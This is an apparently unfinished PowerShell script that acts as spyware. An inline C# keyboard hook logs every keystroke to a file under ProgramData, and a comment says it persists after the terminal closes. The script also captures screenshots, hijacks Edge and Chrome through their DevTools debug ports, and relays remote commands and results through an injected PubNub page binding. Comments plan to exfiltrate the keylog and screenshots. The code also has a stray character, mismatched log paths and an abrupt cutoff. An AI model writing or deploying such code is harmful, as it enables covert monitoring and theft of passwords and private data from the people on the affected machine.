Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)

$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
# $createdNew = $false
# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)

#if (-not $createdNew) {
    #Write-Error "An instance of this script is already running. Exiting."
    #exit 1
#}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 20260925-1432

# note: keeps running even after terminal closed down
Add-Type -TypeDefinition '
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerShell {
public class KeyLogger
{
    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
    public static StringBuilder sb = new StringBuilder("", 80);
    
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    // Delegate for the hook procedure
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Required for the message loop
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = -1;

        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            vkCode = Marshal.ReadInt32(lParam);
            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
            sb.Append("[");
            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
            sb.Append("]");
        }

        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
            string result = sb.ToString();
            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
            sb.Clear();
            sb.Length = 0;
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static void Main()
    {
        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

        // Message loop to keep the hook active
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }

        UnhookWindowsHookEx(_hookID);
    }
}
}
' -ReferencedAssemblies System.Windows.Forms

function Get-Identity {
    $ScriptName = "pscdp.relay.ps1"

    $ComputerName = $env:COMPUTERNAME
    
    $UserName = $env:USERNAME
    
    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
}

$script:identitykvpstr = Get-Identity | ConvertTo-Json

$script:logger_logmsg_i = 0
function Log-Msg {
    param([object]$Msg)

    $caller = (Get-PSCallStack)[0].FunctionName

    if ( (Get-PSCallStack).length -gt 1 ) {
        $caller = (Get-PSCallStack)[1].FunctionName
    }

    $script:logger_logmsg_i++

    if ( $_ -is [System.Exception] -or $_ -is [System.Management.Automation.ErrorRecord]) {
        Write-Host "caller: $caller"
        Write-Error $_.Exception.Message
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
    } else {
        Write-Host "$caller|$script:logger_logmsg_i|$Msg"
    }
}

function Get-Timestamp {
    $ret = Get-Date -Format "HH:mm:ss.fff"
    return $ret
}

function Take-Screenshot() {
    $memoryStream = New-Object System.IO.MemoryStream

    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')

    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        
    $graphic.Dispose()
    $bitmap.Dispose()

    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())

    return $base64String
}

function Get-FrontendUrls() {
    return $script:clientws.GetTargets()
}

function Get-KeyboardLog() {
    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw

    return $text
}

$script:msedge_debugport = 9222
$script:chrome_debugport = 9223


class PSCDPCommand {
    [string]$name
    [int32]$id
    [string]$method
    [hashtable]$params
    [object]$response
    [string]$sessionId
    [scriptblock]$callback
    [bool]$isinvoked = $false
    [bool]$iserror = $false
    [bool]$isbroadcast = $false

    [PSCDPTarget]$target = $null

    [bool]HasCallback() {
        return ( $null -ne $this.callback )
    }

    [hashtable] GetDict() {

        if ( [string]::IsNullOrWhiteSpace($this.method) ) {
            throw 'method is missing'
        }

        $obj = @{
            id=$this.id
            method=$this.method
        }

        if ( $null -ne $this.params ) {
            $obj.Add('params', $this.params)
        }

        if ( ! [string]::IsNullOrWhiteSpace($this.sessionId) ) {
            $obj.Add('sessionId', $this.sessionId)
        }

        return $obj
    }

    [void] SetID([int32]$id) {
        $this.id = $id
    }

    [void] SetSessionID([string]$sessionId) {
        $this.sessionId = $sessionId
    }

    [void] SetResponse([object]$response) {
        $this.response = $response
    }

    [string] ToJSON() {
        $obj = $this.GetDict() 
        $jsonstr = $obj | ConvertTo-Json -Depth 10 -Compress
        return $jsonstr
    }
}

class PSCDPResponse {

}

# TODO create custom new method to generate new object using hashtable 
# PSCDPTarget.GetProperties().Name
class PSCDPTarget {
    [string]$title
    [string]$url
    [string]$targetId
    [string]$type
    [string]$description
    [string]$devtoolsFrontendUrl
    [string]$webSocketDebuggerUrl
    [string]$faviconUrl
    [bool]$attached
    [bool]$canAccessOpener
    [string]$browserContextId
  
    [string]$sessionId

    [byte[]]$pngBytes
    $addbinding_ok = $false     # set when Runtime.addBinding result arrives with success
    $console_log_check = $false    
    $executionContextId = $null # needed to execute Runtime.callFunctionOn

    [hashtable] GetDict() {
        $ht = @{
            title=$this.title
            url=$this.url
            targetId=$this.targetId
            type=$this.type
            description=$this.description
            devtoolsFrontendUrl=$this.devtoolsFrontendUrl
            webSocketDebuggerUrl=$this.webSocketDebuggerUrl
            faviconUrl=$this.faviconUrl
            attached=$this.attached
            canAccessOpener=$this.canAccessOpener
            browserContextId=$this.browserContextId
            sessionId=$this.sessionId
        }

        return $ht
    }

    [string] GetScreenshot() {
        # convert pngBytes to base64 string
        return $null
    }

    static [PSCDPTarget] GetPSCustomObject($obj) {
        $ht = @{
            title=$obj.title
            url=$obj.url
            targetId=$obj.targetId
            type=$obj.type
            description=$obj.description
            devtoolsFrontendUrl=$obj.devtoolsFrontendUrl
            webSocketDebuggerUrl=$obj.webSocketDebuggerUrl
            faviconUrl=$obj.faviconUrl
            attached=$obj.attached
            canAccessOpener=$obj.canAccessOpener
            browserContextId=$obj.browserContextId
            sessionId=$obj.sessionId
        }

        return [PSCDPTarget]$ht
    }
}

$script:SendPBMessage_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )
    
    if ( $Response.cmd.isbroadcast ) {
        $cdpobj.broadcastresponses.Add($Response)
    }
}

$script:runtime_evaluate_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $pass = $false
    $cmd = $null
    $target = $null

    try {
        $cmd = $Response.cmd
        $target = $cmd.target

        if ( ! $Response.cmd.iserror ) {
            $pass = $true
        }
    } catch {
        Write-Error $_.Exception.Message
    }

    $target.console_log_check = $pass
}

$script:runtime_addBinding_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $target = $Response.cmd.target

    $target.addbinding_ok = $true

    $params = @{
        expression="(function() { console.log(`"PubNub Status Notification -- Successfully connected from pscdp.relay.ps1 -- "+ $(Get-Timestamp) + " `"); return " + $(Get-Random -Minimum 1 -Maximum 100) + "; })()"
        returnByValue=$true
    }

    $this.sendQueue.Add( @{ method="Runtime.evaluate"; params=$params; target=$target; callback=$script:runtime_evaluate_callback } )
}

function Transform-PSCustomObject($obj) {
    $ht = @{}

    try {
        $obj.psobject.Properties | ForEach-Object {
            $ht[$_.Name] = $_.Value
        }
    } catch {

    }
    
    return $ht;
}

function Exec-CDP {
    param($cmd)

    Log-Msg "pass"
}

function Process-CDP {
    param($cmd)

    $devurl = $cmd.url

    if ( [string]::IsNullOrEmpty($devurl) ) {
        return $null
    }

    $ret = $null

    try {
        $httpres = Invoke-WebRequest -Method Get -Uri $devurl -ErrorAction Stop -UseBasicParsing

        $bodystr = $httpres.Content.Replace("devtools: ws://127.0.0.1:*", "devtools: ws://127.0.0.1:* ws://localhost:*")
        $bodystr = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($bodystr))

        $ret = @{
            headers=$httpres.Headers
            body=$bodystr
            requesturl=$devurl
        }

    } catch {
        Log-Msg $_
        return $null
    }        

    return $ret
}

function Process-PubNubEvent {

    param([string]$Message)

    try {
        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.

        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
            return
        }
    
        
    } catch {

    }

    $isbuiltincmd = $false
    $cmd = $null

    try {
        if ( ! [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
            $isbuiltincmd = $true
            $cmd = $payload.message
        }
    } catch {

    }

    if ( ! $isbuiltincmd -and $null -ne $cmd ) {
        return
    }

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
    }
k
    if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
        $result = Get-FrontendUrls
    } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
        $result = Process-CDP($cmd)
    } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
        $result = Exec-CDP($cmd)
    } elseif ( $cmd.builtincmd -eq "RefreshTargets" ) {
        $targets = $script:clientws.targets # TODO doesn't have sessionId populated

        $ttargets = $targets | ForEach-Object { $_.GetDict() }
        <#
        if ($null -ne $byteArray -and $byteArray.Length -gt 0) {
            $screenshot = [System.Convert]::ToBase64String($target.pngBytes) # convert bytes to base64
        }
        #>

        $result = $ttargets
    }

    $resultout['result'] = $result

    $script:pubnubws.SendPBMessage($resultout)

    # GetScreenshot  --> send back image as base64 string --> requires chunking
    # GetKeyboardLog --> send back owdkeyboardlog.txt file --> might also require chunking
}

function Ping-DebugPort {
    param($debugport)

    try {
        $targets = Invoke-RestMethod -Uri "http://localhost:$debugport/json" -ErrorAction Stop
    } catch [System.Net.WebException] {
        Log-Msg "[R5P9]: $($_.Exception.Message)"
        return $null
    }        


    # $targets | Select-Object title, id, webSocketDebuggerUrl
    $targets = $targets | Where-Object { $_.type -eq "page" }

    return $targets
}

function Find-ActiveClientBrowser {
    # should return debug port (9222 or 9223) and browser name
    # of client browser if any
}

function Find-PubNubBrowser {
    # should find the browser used to make pubnub connections
}

class PSCDPException : System.Exception {
    [bool]$ispubnubnull

    PSCDPException([string]$Message, $ispubnubnull) : base($Message) {
        $this.ispubnubnull = $ispubnubnull
    }
}

class PSCDP {

    $debugport = 9223
    $pubnuburl = $null

    $logconsolemsg = $false
    $bufferSize = 4096
    $resetonattach = $false

    $wsUri = $null
    $websocket = $null

    $sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
    $responses = [System.Collections.Generic.List[object]]::new()
    $broadcastresponses = [System.Collections.Generic.List[object]]::new()
    $broadcasterrors = [System.Collections.Generic.List[object]]::new()
    $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $results = [System.Collections.Generic.List[object]]::new()
    $errors = [System.Collections.Generic.List[object]]::new() 
    $pubnubmsgs = [System.Collections.Generic.List[object]]::new()

    $targets = [System.Collections.Generic.List[PSCDPTarget]]::new()

    [PSCDPTarget]$pubnubTarget = $null

    [int32]$messageId = 1
    $receiveNew = $true
    $byteArray = $null
    $segment = $true
    $task = $true
    $memoryStream = [System.IO.MemoryStream]::new()
    $totalbytecount = 0
    $result = $null


    [void] Reset() {
        $this.wsUri = $null
        $this.websocket = $null
    
        $this.sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
        $this.responses = [System.Collections.Generic.List[object]]::new()
        $this.broadcastresponses = [System.Collections.Generic.List[object]]::new()
        $this.broadcasterrors = [System.Collections.Generic.List[object]]::new()
        $this.commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
        $this.broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
        $this.results = [System.Collections.Generic.List[object]]::new()
        $this.errors = [System.Collections.Generic.List[object]]::new() 
        $this.pubnubmsgs = [System.Collections.Generic.List[object]]::new()
        $this.callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
        $this.targets = [System.Collections.Generic.List[PSCDPTarget]]::new()

        $this.messageId = 1
        $this.receiveNew = $true
        $this.byteArray = $null
        $this.segment = $true
        $this.task = $true
        $this.memoryStream = [System.IO.MemoryStream]::new()
        $this.totalbytecount = 0
        $this.result = $null
        $this.pubnubTarget = $null
    }

    [void] CheckSocket() {

        if ( $this.IsSocketHealthy() ) {
            return
        }

        if ( $null -eq $this.webSocket ) {
            throw "websocket is null"
        }

        if ( ! $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) {
            throw 'websocket is not open'
        }
        
    }

    [bool] IsSocketHealthy() {
        if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
            return $true
        }

        return $false
    }

    PSCDP() {
    }

    PSCDP($debugport) {
        $this.debugport = $debugport
    }

    PSCDP($debugport, $pubnuburl) {
        $this.debugport = $debugport
        $this.pubnuburl = $pubnuburl
    }

    [string] GetWSUrI() {

        if (! [string]::IsNullOrWhiteSpace($this.wsUri)) {
            return $this.wsUri
        }

        $ttargets = $this.GetTargets()

        if ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) {
            $twsUri = ($ttargets | Where-Object { $_.url -eq $this.pubnuburl } | Select-Object -First 1).webSocketDebuggerUrl
        } else {
            $twsUri = ($ttargets | Select-Object -First 1).webSocketDebuggerUrl
        }

        return $twsUri
    }

    [System.Collections.Generic.List[PSCDPTarget]] GetTargets() {
        $ttargets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json/list" -ErrorAction Stop

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]::new()

        $stargets = $ttargets | Where-Object { $_.type -eq "page" } | ForEach-Object {
            $target = @{}
            $_.psobject.Properties | ForEach-Object { 
                $key = $_.Name
                
                if ( $key -eq "id" ) {
                    $key = "targetId"
                }

                $target[$key] = $_.Value 
            }
            
            [PSCDPTarget]$target
        }

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]$stargets
        return $stargets
    }

    [void] ConnectCdp() {
        Log-Msg "new CDP connection at $($this.debugport)"

        $this.wsUri = $this.GetWSURI()

        if ( [string]::IsNullOrWhiteSpace($this.wsUri) ) {
            throw "wsUri is empty"
        }

        if ( $null -eq $this.websocket ) {
            Log-Msg "connecting to cdp on [$($this.wsUri)]"
        } else {
            Log-Msg "reconnecting to cdp on [$($this.wsUri)]"
        }
    
        $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket
        $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)

        if ( $null -eq $this.websocket) {
            throw "could not connect websocket"
        }

        $connectTask.Wait()
        
        Log-Msg "Connected! Current WebSocketState: $($this.websocket.State)" -ForegroundColor Green

        $params = @{
            autoAttach = $true
            waitForDebuggerOnStart = $false
            flatten = $true
            filter= @(
                @{
                    type="page"
                    exclude=$false
                }
            )
        }
        $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } ) 
    
        $this.sendQueue.Add( @{ method="Target.setDiscoverTargets"; params=@{ discover=$true} } ) 

        $this.sendQueue.Add( @{ method="Target.getTargets"} ) 
    }

    [PSCDPCommand] GetCommandByID([string]$id) {
        $cmd = $this.commands | Where-Object { $_.id -eq $id } | Select-Object -First 1
        return $cmd
    }

    [PSCDPCommand] GetCommand([string]$name) {
        $cmd = $this.commands | Where-Object { $_.name -eq $name } | Select-Object -First 1
        return $cmd
    }

    [object] GetResultByID($id) {
        $cmd = $this.GetCommandByID($id)

        if ( $null -eq $cmd ) {
            return $null
        }

        return $this.GetResultByCmd($cmd)
    }

    [object] GetResultByCmd([PSCDPCommand]$cmd) { #TODO refactor to return PSCDPResponse object
        try {
            $id = $cmd.id

            if ( ( $null -eq $this.results ) -or ( $this.results.Count -le 0 ) ) {
                return $null
            }

            $arr = $this.results.ToArray()
            for ($i = 0; $i -lt $arr.Count; $i++) {
                $t = $arr[$i]

                if ( ($t.id).ToString() -eq ($id).ToString() ) {
                    return $t
                }

            }
            
            return $null
        } catch {
            Write-Error $_.Exception.Message
        }

        return $null
    }

    [object] GetResult([string]$cmdname) { #TODO refactor to return PSCDPResponse object

        $cmd = $this.GetCommand($cmdname)

        if ( $null -eq $cmd ) {
            return $null
        }

        return $this.GetResultByCmd($cmd)
    }

    [PSCDPCommand] SendCdpCommand([PSCDPCommand]$cmd) {
        
        if ( $null -eq $this.websocket ) {
            throw "websocket is null"
        }

        if ($this.websocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "Cannot send command. WebSocket is not Open (State: $($this.websocket.State))"
        }

        if ( $null -eq $cmd ) {
            throw "cmd is null"
        }

        $id = $this.messageId++

        $cmd.id = $id
        
        $this.commands.Add($cmd)

        if ( $cmd.HasCallback() ) {
            $this.callbackcmds.Add($cmd)
        }

        $payload = $cmd.ToJson() 
    
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    
        if (! $this.websocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            throw "web socket is not open"
        }
    
        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
        
        if ( $null -ne $sendTask ) {
            $tresult = $sendTask.GetAwaiter().GetResult()
        } else {
            throw "fatal error -- task is null"
        }

        return $cmd
    }
    
    [void] InitReceive() {
        if ( ! $this.receiveNew ) {
            Log-Msg "... existing receive in progress"
            return
        }

        Log-Msg "...kicking off new receive"
        $this.byteArray = [byte[]]::new($this.bufferSize)
        $this.segment = [ArraySegment[byte]]::new($this.byteArray)                

        $this.task = $this.webSocket.ReceiveAsync($this.segment, [System.Threading.CancellationToken]::None)
        $this.receiveNew = $false
    }

    [void] ReadMessage() {
        if ( ! $this.task.IsCompleted ) {
            Log-Msg "... receive not completed -- skipping"
            return
        }

        Log-Msg "...waiting for result"

        $this.result = $this.task.GetAwaiter().GetResult()
        # TODO: throws error -- The remote party closed the WebSocket connection without completing the close handshake.

        $this.receiveNew = $true

        if ($this.result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
            throw "WebSocket connection closed by the remote host."
        }
        elseif ($this.task.IsFaulted) {
            throw "[X2H2] Receive failed: $($this.task.Exception.InnerException.Message)"
        }
        elseif ($this.task.IsCanceled) {
            throw "[A2O9] Receive operation was cancelled."
        }
        elseif ( ! ( $this.task.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion ) ) {
            throw "task Status != RanToCompletion"
        } else {

            $bytesReceived = $this.result.Count
            
            Log-Msg "...received $bytesReceived bytes"
            
            if ($bytesReceived -gt 0) {
                $this.memoryStream.Write($this.byteArray, 0, $bytesReceived)

                $this.totalbytecount = $this.totalbytecount + $bytesReceived
                Log-Msg "...total bytes $($this.totalbytecount)"
            }

        }
    }

    [bool] IsMessageError([hashtable]$msg) {

        $iserror = $false

        try {

            if ( $msg.ContainsKey('error') ) {
                $iserror = $true
                throw ""
            }

            if ( ! $msg.ContainsKey('result') ) {
                throw ""
            }
    
            if ( $msg.result.result.subtype -eq "error" ) {
                $iserror = $true
                throw ""
            }
    
            if ( ! [string]::IsNullOrEmpty($msg.result.exceptionDetails.exceptionId) ) {
                $iserror = $true
                throw ""
            }
    
    
        } catch {
            
        }
    
        return $iserror
    }

    [void] EndMessage() {
        if ( ! $this.result.EndOfMessage) {
            Log-Msg "... message is not complete -- skipping"
            return
        }

        $completeBytes = $this.memoryStream.ToArray()

        Log-Msg "...message is complete"

        if ( $completeBytes.count -le 0 ) {
            Log-Msg "empty message -- skipping"
            return
        }

        $json = [System.Text.Encoding]::UTF8.GetString($completeBytes)
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.totalbytecount = 0

        if ( [string]::IsNullOrWhiteSpace($json) ) {
            return
        }

        $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
        
        $iserror = $false
        $isresult = $false
        $attachedToTarget = $false # Target.attachedToTarget
        $targetCreated = $false
        $bindingCalled = $false
        $consoleAPICalled = $false
        $executionContextCreated = $false
        $executionContextDestroyed = $false
        $executionContextsCleared = $false
        $sessionId = $null

        try { $sessionId = $msg.params.sessionId } catch { }

        $msght = @{}
        $msg.psobject.Properties | ForEach-Object {

            if ( $_.Name -eq "result" ) {
                $isresult = $true
            } elseif ( $_.Name -eq "method" )  {
                if ( $_.Value -eq 'Target.attachedToTarget' ) {
                    $attachedToTarget = $true
                } elseif ( $_.Value -eq 'Target.targetCreated' ) {
                    $targetCreated = $true
                } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                    $bindingCalled = $true
                } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
                    $consoleAPICalled = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextCreated' ) {
                    $executionContextCreated = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextDestroyed' ) {
                    $executionContextDestroyed = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextsCleared' ) {
                    $executionContextsCleared = $true
                }

            } elseif ( $_.Name -eq "error" ) {
                $iserror = $true
            } elseif ( $_.Name -eq "id" ) {
                $isresult = $true
            }

            $msght[$_.Name] = $_.Value
        }

        $this.responses.Add($msght)

        $iserror = $iserror -or $this.IsMessageError($msght)
        if ( $iserror ) {
            $this.errors.Add($msght)
        }

        # check if msg is a response to an issued cmd
        if ( $isresult ) {
            $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 
        
            if ( $null -ne $cmd ) {
                $cmd.response = $msght
                $cmd.iserror = $iserror
            }

            $msght.Add('cmd', $cmd)

            $this.results.Add($msght)
        }

        # TODO needs error checking to ensure objects have properties being accessed
        if ( $bindingCalled ) {
            if ( $msght['params'].name -eq "onPubNubEvent" ) { # $msght['params'].payload
                Log-Msg "processing incomming PubNub event"
                $this.pubnubmsgs.Add($msght)
                $payload = $msght['params'].payload
                Process-PubNubEvent -Message $payload
            } # $pubnubmsg
        }

        if ( $consoleAPICalled ) {
            $msghtstr = $msght.GetEnumerator() | ForEach-Object { "{0}={1}" -f $_.Key, $_.Value } | Out-String
            
            if ( $this.logconsolemsg ) {
                Log-Msg $msghtstr 
                Log-Msg ($msght['params'].args | Out-String)
            }

        }

        if ( $executionContextCreated ) {
            $origin = $msg.params.context.origin
            $executionContextId = $msg.params.context.id

            $target = $this.targets | Where-Object { $_.sessionId -eq $sessionId } | Select-Object -First 1

            if ( $null -ne $target ) {
                $target.executionContextId = $executionContextId
            }

            if ( $null -ne $this.pubnubTarget ) {
                $initorigin = [System.Uri]$this.pubnuburl
                $initorigin = "$($initorigin.Scheme)://$($initorigin.Host)"

                if ( $origin -eq $initorigin ) {
                    $this.pubnubTarget.executionContextId = $executionContextId
                }
            }
        }

        if ( $executionContextDestroyed ) {
            $texecutionContextId = $msg.params.executionContextId
            # pass
        }
    
        if ( $executionContextsCleared ) {
            # TODO check if $pubnubtarget.sessionId -eq $sessionid
            throw "executionContextsCleared -- reset CDP connection"
        }

        if ( $targetCreated ) { # add target to list
            $targetInfo = $msg.params.targetInfo

            if ( $targetInfo.type -eq "page" ) {
                $targetInfo = [PSCDPTarget]::GetPSCustomObject($targetInfo)

                $this.targets.Add($targetInfo)

                $this.sendQueue.Add( @{ method="Target.attachToTarget"; params=@{ targetId=$targetInfo.targetId; flatten=$true }; } )

                if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
                    $this.pubnubTarget = $targetInfo
                }
            }
            
        }

        if ( $attachedToTarget ) { # update sessionId
            
            $targetInfo = [PSCDPTarget]$msg.params.targetInfo
            $targetInfo.sessionId = $sessionId

            $target = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1

            if ( $null -eq $target ) {
                $this.targets.Add($targetInfo)
            } else {
                $target.sessionId = $sessionId
            }

            if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
                $this.pubnubTarget = $targetInfo # ? should not be necessary
                $this.LoadQueue($targetInfo)
            }
        }

    }
    
    [void] NextCmd() {

        if ( $this.sendQueue.IsCompleted -or ( $this.sendQueue.Count -le 0 ) ) {
            return
        }

        Log-Msg ( "sending cmd -- cmds count: " + $this.sendQueue.Count )
        
        $cmd = $null

        try {
            $ht = $this.sendQueue.Take()
            $cmd = [PSCDPCommand]$ht
        } catch {
            Log-Msg $_
        }

        $cmd = $this.SendCdpCommand($cmd)
    }

    # TODO refactor so that only commands with pending callback is being traversed
    [void] ExecCallbacks() {

        for ( $i = 0; $i -lt $this.commands.Count; $i++) {
            $cmd = $this.commands[$i]

            if ( $cmd.HasCallback() -and ( ! $cmd.isinvoked ) -and ( $null -ne $cmd.response) ) {
                $cmd.callback.Invoke($cmd.response,$this)
                $cmd.isinvoked = $true
            }

        }

    }

    [void] LoadQueue([PSCDPTarget]$target) {

        $this.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true }; target=$target } )
        $this.sendQueue.Add( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true }; target=$target } )
        $this.sendQueue.Add( @{ method="DOM.enable"; params=@{ enabled = $true }; target=$target } )
        $this.sendQueue.Add( @{ method="Runtime.enable"; params=@{ enabled = $true }; target=$target } )
        $this.sendQueue.Add( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; target=$target; callback=$script:runtime_addBinding_callback } )

        # $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
        # Network.enable
    }

    [void] SendPBMessage([hashtable]$cmd) {

        if ( [string]::IsNullOrEmpty($this.pubnubTarget.executionContextId) ) {
            throw 'executionContextId is empty'
        }

        $json = $cmd | ConvertTo-Json # TODO wrap in try catch and report error as needed
        $tbytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        $jsonb = "`"" + [System.Convert]::ToBase64String($tbytes) + "`""

        $params = @{
            functionDeclaration="function f() { let tpayload=JSON.parse(atob($jsonb)); sendMessage(tpayload); }"
            executionContextId=$this.pubnubTarget.executionContextId
            returnByValue=$true
        }

        $msg = @{ 
            method="Runtime.callFunctionOn"; 
            params=$params; 
            target=$this.pubnubTarget; 
            callback=$script:SendPBMessage_callback; 
            isbroadcast=$false 
        }

        $this.sendQueue.Add( $msg )

        if ( $cmd.ContainsKey('builtincmd') -and $cmd['builtincmd'] -eq "SendBroadcast" ) {
            $msg['isbroadcast'] = $true
            $this.broadcasts.Add($msg)
        }
    }

    [void] Broadcast() {
        $target = $this.pubnubTarget

        if ( $null -eq $target ) {
            throw [PSCDPException]::new("pubnub target null", $true)
        }

        if ( ! $target.addbinding_ok ) {
            throw [PSCDPException]::new("pubnub target in incorrect state -- addbinding_ok=$($target.addbinding_ok)", $true)
        } elseif ( [string]::IsNullOrEmpty($target.executionContextId) ) {
            throw [PSCDPException]::new("pubnub target in incorrect state -- executionContextId=$($target.executionContextId)", $true)
        }

        $cmd = @{
            builtincmd="SendBroadcast"
            source="pscdp.relay.ps1"
            destination="BROADCAST"
            ts=$(Get-Timestamp)
            cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
        }

        $this.SendPBMessage($cmd)
    }

    [void] LogState() {
        try {
            $msgstrs = @()
            $msgstrs += "sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count)"
            $msgstrs += "results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count)"
            $msgstrs += "broadcasts sent: $($this.broadcasts.Count) broadcasts received: $($this.broadcastresponses.Count) broadcast errors: $($this.broadcasterrors.Count)"
            $msgstrs += "console.log: $($this.pubnubTarget.console_log_check)"
            $msgstrs += "addbinding_ok: $($this.pubnubTarget.addbinding_ok)"
            $msgstrs += "executionContextId: $($this.pubnubTarget.executionContextId)"
